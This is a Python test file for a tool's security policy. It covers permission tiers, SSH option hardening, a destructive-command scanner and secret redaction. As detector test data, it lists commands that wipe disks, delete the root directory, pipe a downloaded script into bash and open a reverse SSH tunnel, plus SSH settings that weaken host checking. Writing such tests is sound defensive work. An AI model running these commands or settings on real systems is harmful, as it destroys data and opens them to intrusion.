"""Permission tiers, SSH hardening and destructive-command guards."""

from __future__ import annotations

import pytest

from rcf.core.errors import ConfigError, PermissionDenied
from rcf.security.policy import (
    OPERATION_TIERS,
    PermissionTier,
    SecurityPolicy,
    assert_safe_command,
    normalize_ssh_options,
    scan_dangerous_command,
)
from rcf.security.redaction import redact, redact_obj


def test_every_operation_has_a_tier():
    for operation in OPERATION_TIERS:
        assert isinstance(OPERATION_TIERS[operation], PermissionTier)


def test_read_only_is_always_allowed():
    policy = SecurityPolicy(allow_execute=False)
    assert policy.check("run.plan") is PermissionTier.READ_ONLY


def test_disabled_execute_tier_is_refused():
    policy = SecurityPolicy(allow_execute=False)
    with pytest.raises(PermissionDenied, match="disabled"):
        policy.check("run.submit")


def test_environment_mutation_is_gated_by_ownership_not_a_boolean():
    """The tiers no longer encode 'may install'; the path rules do."""

    policy = SecurityPolicy()
    assert policy.tier_of("environment.apply") is PermissionTier.EXECUTE
    # Kill switch still works: with execute disabled, nothing runs.
    with pytest.raises(PermissionDenied):
        SecurityPolicy(allow_execute=False).check("environment.apply")


def test_system_admin_is_off_by_default():
    policy = SecurityPolicy()
    with pytest.raises(PermissionDenied):
        policy.check("system.modify")


def test_confirmation_can_be_required():
    policy = SecurityPolicy(require_confirmation=True)
    with pytest.raises(PermissionDenied, match="confirmation"):
        policy.check_confirmation("run.submit", False)
    policy.check_confirmation("run.submit", True)


def test_unknown_operation_never_defaults_to_allowed():
    with pytest.raises(PermissionDenied):
        SecurityPolicy().check("run.do_something_undefined")


@pytest.mark.parametrize(
    "command",
    [
        "sudo apt install x",
        "rm -rf /",
        "rm -rf ~/",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb1",
        "shutdown -h now",
        "curl https://x.sh | bash",
        "ssh -R 9000:localhost:22 peer",
    ],
)
def test_destructive_commands_are_detected(command):
    assert scan_dangerous_command(command)


def test_safe_commands_are_not_flagged():
    assert scan_dangerous_command("python train.py --epochs 10") == []
    assert scan_dangerous_command("rm -rf ./build") == []


def test_assert_safe_command_raises_for_sudo():
    with pytest.raises(PermissionDenied, match="destructive"):
        assert_safe_command("sudo systemctl restart nginx", context="run plan")


def test_ssh_options_accept_harmless_values():
    options = normalize_ssh_options(["-o", "Compression=yes", "-o", "ServerAliveInterval=15"])
    assert options == ["-o", "Compression=yes", "-o", "ServerAliveInterval=15"]


@pytest.mark.parametrize(
    "options",
    [
        ["-o", "StrictHostKeyChecking=no"],
        ["-o", "StrictHostKeyChecking=accept-new"],
        ["-o", "UserKnownHostsFile=/dev/null"],
        ["-o", "BatchMode=no"],
        ["-o", "PasswordAuthentication=yes"],
    ],
)
def test_ssh_options_reject_weakening_values(options):
    with pytest.raises(ConfigError):
        normalize_ssh_options(options)


def test_ssh_options_reject_unknown_flags():
    with pytest.raises(ConfigError, match="not allowed"):
        normalize_ssh_options(["-A"])


def test_redaction_removes_tokens_and_passwords():
    text = "password=hunter2 token: abc123 " + "AKIA" + "ABCDEFGHIJKLMNOP"
    cleaned = redact(text)
    assert "hunter2" not in cleaned
    assert "abc123" not in cleaned
    assert "AKIA" not in cleaned


def test_redaction_removes_private_key_blocks():
    text = "-----BEGIN " + "OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----"
    assert "AAAA" not in redact(text)


def test_redaction_of_objects_hides_secret_keys():
    payload = {"password": "x", "nested": {"api_token": "y", "ok": "z"}}
    cleaned = redact_obj(payload)
    assert cleaned["password"] == "<redacted>"
    assert cleaned["nested"]["api_token"] == "<redacted>"
    assert cleaned["nested"]["ok"] == "z"
